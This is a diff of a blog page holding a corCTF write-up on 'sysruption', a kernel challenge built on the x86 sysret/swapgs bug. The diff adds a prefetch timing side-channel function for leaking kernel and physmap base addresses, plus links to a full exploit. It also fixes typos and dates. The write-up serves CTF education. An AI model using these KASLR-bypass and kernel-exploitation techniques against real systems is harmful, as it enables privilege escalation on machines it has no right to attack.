@@ -10,7 +10,7 @@
     <meta charset="utf-8">
 
 <!-- begin _includes/seo.html --><title>corCTF: sysruption writeup - zolutal’s blog</title>
-<meta name="description" content="">
+<meta name="description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">
 
 
   <meta name="author" content="Justin Miller">
@@ -26,7 +26,7 @@
 <meta property="og:url" content="https://zolutal.github.io/corctf-sysruption/">
 
 
-  <meta property="og:description" content="">
+  <meta property="og:description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">
 
 
 
@@ -34,7 +34,7 @@
 
   <meta name="twitter:site" content="@zolutal">
   <meta name="twitter:title" content="corCTF: sysruption writeup">
-  <meta name="twitter:description" content="">
+  <meta name="twitter:description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">
   <meta name="twitter:url" content="https://zolutal.github.io/corctf-sysruption/">
 
   
@@ -46,7 +46,7 @@
 
 
 
-  <meta property="article:published_time" content="2023-06-17T00:00:00+00:00">
+  <meta property="article:published_time" content="2023-07-30T00:00:00+00:00">
 
 
 
@@ -285,8 +285,8 @@
 
   <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
     <meta itemprop="headline" content="corCTF: sysruption writeup">
-    <meta itemprop="description" content="">
-    <meta itemprop="datePublished" content="2023-06-17T00:00:00+00:00">
+    <meta itemprop="description" content="I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!">
+    <meta itemprop="datePublished" content="2023-07-30T00:00:00+00:00">
     
 
     <div class="page__inner-wrap">
@@ -308,7 +308,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          24 minute read
+          25 minute read
         
       </span>
     
@@ -320,15 +320,7 @@
 
       <section class="page__content" itemprop="text">
         
-        <style>
-.caption {
-  text-align: center;
-  font-size: .8rem !important;
-  color: lightgrey;
-}
-</style>
-
-<p>I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!</p>
+        <p>I played corCTF this weekend and managed to solve two pretty tough challenges. This will be a writeup for the first of those two, sysruption, which I managed to get first-blood on!</p>
 
 <p style="text-align: center;"><img src="/assets/corctf-sysruption/first-blood.png" alt="first-blood" /></p>
 
@@ -339,6 +331,30 @@
 </blockquote>
 
 <p>So pretty much a combination of my favorite research topics :D</p>
+
+<p>Plus it had this sick motd!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ██████ ▓██   ██▓  ██████  ██▀███   █    ██  ██▓███  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █
+▒██    ▒  ▒██  ██▒▒██    ▒ ▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █
+░ ▓██▄     ▒██ ██░░ ▓██▄   ▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒
+  ▒   ██▒  ░ ▐██▓░  ▒   ██▒▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒
+▒██████▒▒  ░ ██▒▓░▒██████▒▒░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░
+▒ ▒▓▒ ▒ ░   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒
+░ ░▒  ░ ░ ▓██ ░▒░ ░ ░▒  ░ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░         ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
+░  ░  ░   ▒ ▒ ░░  ░  ░  ░    ░░   ░  ░░░ ░ ░ ░░         ░       ▒ ░░ ░ ░ ▒     ░   ░ ░
+      ░   ░ ░           ░     ░        ░                        ░      ░ ░           ░
+          ░ ░
+</code></pre></div></div>
+
+<p>dist:
+<a href="/assets/corctf-sysruption/dist/patch.diff">patch</a>
+<a href="/assets/corctf-sysruption/dist/bzImage">bzImage</a>
+<a href="/assets/corctf-sysruption/dist/initramfs.cpio.gz">initramfs</a>
+<a href="/assets/corctf-sysruption/dist/kconfig">kconfig</a></p>
+
+<p>exploit:
+<a href="/assets/corctf-sysruption/exploit.c">exploit.c</a>
+<a href="/assets/corctf-sysruption/exploit">exploit</a></p>
 
 <h2 id="patchwork">patchwork</h2>
 
@@ -515,7 +531,7 @@ directly related to the task-switch mechanism. This information includes:
     <span class="nf">sysretq</span>
 </code></pre></div></div>
 
-<p>But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero and results in a pagefault when.</p>
+<p>But since swapgs was executed right before sysret and the GP handler sees that the GP was from kernel mode (CPL was 0) swapgs is not executed again in the GP handler, meaning it executes with a userspace gsbase. This becomes a problem when the GP handler tries to access percpu variables since user space gsbase is usually unused and set to zero so that results in a pagefault.</p>
 
 <p>Lets take a deeper look at what is going on in the GP handler.</p>
 
@@ -529,7 +545,8 @@ directly related to the task-switch mechanism. This information includes:
     <span class="nf">call</span>   <span class="nv">exc_general_protection</span>
     <span class="nf">jmp</span>    <span class="nv">error_return</span>
 </code></pre></div></div>
-<p>When a GP occurs execution is redirected to the handler above, which immediately calls into <code class="language-plaintext highlighter-rouge">error_entry</code>. The <code class="language-plaintext highlighter-rouge">error_entry</code> function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of <code class="language-plaintext highlighter-rouge">error_entry</code> is:</p>
+
+<p>When a GP occurs, execution is redirected to the handler above, which immediately calls into <code class="language-plaintext highlighter-rouge">error_entry</code>. The <code class="language-plaintext highlighter-rouge">error_entry</code> function is pretty generic and shared across many of the fault/trap handlers of the kernel, the start of <code class="language-plaintext highlighter-rouge">error_entry</code> is:</p>
 
 <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">error_entry:</span>
     <span class="nf">push</span>   <span class="nb">rsi</span>
@@ -578,7 +595,7 @@ directly related to the task-switch mechanism. This information includes:
 
 <p>So how can we survive this?</p>
 
-<p>In the ptrace sysret blog, the author survives the double fault by targetintg the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don’t have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.</p>
+<p>In the ptrace sysret blog, the author survives the double fault by targeting the Interrupt Descriptor Table (IDT) in order to hijack the page fault handler to userspace. Unfortunately, we are living in the future meaning we don’t have a writeable IDT and SMEP would anyways prevent us from executing off a user space page. So I had to find some other way to survive triggering the bug.</p>
 
 <p>Well the gsbase belongs to userspace, but can we control our own gsbase? can we make it point to a kernel address?</p>
 
@@ -591,9 +608,9 @@ directly related to the task-switch mechanism. This information includes:
         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </code></pre></div></div>
 
-<p>The same is true of <code class="language-plaintext highlighter-rouge">arch_prctl(ARCH_SET_GS)</code> and probably sigreturn as well…</p>
+<p>The same is true of <code class="language-plaintext highlighter-rouge">arch_prctl(ARCH_SET_GS)</code> as well…</p>
 
-<p>Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gs base be set from user space via the wrgsbase instruction!</p>
+<p>Luckily x86 has an extension called fsgsbase that is commonly enabled, which lets gsbase be set from user space via the wrgsbase instruction!</p>
 
 <p><code class="language-plaintext highlighter-rouge">asm volatile("wrgsbase %0" : : "r" (gsbase));</code></p>
 
@@ -615,7 +632,9 @@ directly related to the task-switch mechanism. This information includes:
 
 <p>But that was simple enough, all I had to do was define some ranges and step sizes that work for physmap and add a flag to choose which randomization I want to break.</p>
 
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// largely based on: https://www.willsroot.io/2022/12/entrybleed.html</span>
+
+<span class="cp">#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
 #define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
 </span>
 <span class="cp">#define STEP_KERNEL 0x100000ull
@@ -634,6 +653,33 @@ directly related to the task-switch mechanism. This information includes:
 <span class="cp">#define DUMMY_ITERATIONS 5
 #define ITERATIONS 100
 </span>
+<span class="c1">// https://www.willsroot.io/2022/12/entrybleed.html</span>
+<span class="kt">uint64_t</span> <span class="nf">sidechannel</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">uint64_t</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">;</span>
+  <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">".intel_syntax noprefix;"</span>
+    <span class="s">"mfence;"</span>
+    <span class="s">"rdtscp;"</span>
+    <span class="s">"mov %0, rax;"</span>
+    <span class="s">"mov %1, rdx;"</span>
+    <span class="s">"xor rax, rax;"</span>
+    <span class="s">"lfence;"</span>
+    <span class="s">"prefetchnta qword ptr [%4];"</span>
+    <span class="s">"prefetcht2 qword ptr [%4];"</span>
+    <span class="s">"xor rax, rax;"</span>
+    <span class="s">"lfence;"</span>
+    <span class="s">"rdtscp;"</span>
+    <span class="s">"mov %2, rax;"</span>
+    <span class="s">"mov %3, rdx;"</span>
+    <span class="s">"mfence;"</span>
+    <span class="s">".att_syntax;"</span>
+    <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">a</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">c</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">d</span><span class="p">)</span>
+    <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+    <span class="o">:</span> <span class="s">"rax"</span><span class="p">,</span> <span class="s">"rbx"</span><span class="p">,</span> <span class="s">"rcx"</span><span class="p">,</span> <span class="s">"rdx"</span><span class="p">);</span>
+  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">a</span><span class="p">;</span>
+  <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">|</span> <span class="n">c</span><span class="p">;</span>
+  <span class="k">return</span> <span class="n">c</span> <span class="o">-</span> <span class="n">a</span><span class="p">;</span>
+<span class="p">}</span>
+
 <span class="kt">uint64_t</span> <span class="nf">prefetch</span><span class="p">(</span><span class="kt">int</span> <span class="n">phys</span><span class="p">)</span>
 <span class="p">{</span>
     <span class="kt">uint64_t</span> <span class="n">arr_size</span> <span class="o">=</span> <span class="n">ARR_SIZE_KERNEL</span><span class="p">;</span>
@@ -678,8 +724,8 @@ directly related to the task-switch mechanism. This information includes:
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
     <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
 
-    <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
-    <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">kaslr</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc00000</span><span class="p">;</span>
+    <span class="kt">uint64_t</span> <span class="n">phys</span> <span class="o">=</span> <span class="n">prefetch</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x100000000</span><span class="p">;</span>
 
     <span class="n">printf</span><span class="p">(</span><span class="s">"KERNEL base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">kaslr</span><span class="p">);</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"PHYS base %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">phys</span><span class="p">);</span>
@@ -1035,11 +1081,20 @@ gsbase: 0xffff8d913bc00000
 corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs manual.}
 </code></pre></div></div>
 
-<p>After a few runs the prefetch attacks succeeded and it worked remotely too! flag!</p>
+<p>After a few runs the prefetch attacks succeeded and the exploit worked! flag!</p>
 
 <h2 id="closing">closing</h2>
 
-<p>This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug every since I learned about it.</p>
+<p>This challenge was awesome, I had been hoping someone would create a challenge around the sysret bug ever since I learned about it. So, thanks to FizzBuzz101 for creating this challenge!</p>
+
+<style>
+.caption {
+  text-align: center;
+  font-size: .8rem !important;
+  color: lightgrey;
+}
+</style>
+
 
         
       </section>
@@ -1056,7 +1111,7 @@ corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG
     <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
     <span itemprop="keywords">
     
-      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+      <a href="/tags/#ctf-writeup" class="page__taxonomy-item" rel="tag">CTF Writeup</a><span class="sep">, </span>
     
       <a href="/tags/#exploitation" class="page__taxonomy-item" rel="tag">Exploitation</a><span class="sep">, </span>
     
@@ -1072,7 +1127,7 @@ corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-06-17T00:00:00+00:00">June 17, 2023</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-07-30T00:00:00+00:00">July 30, 2023</time></p>
 
 
       </footer>
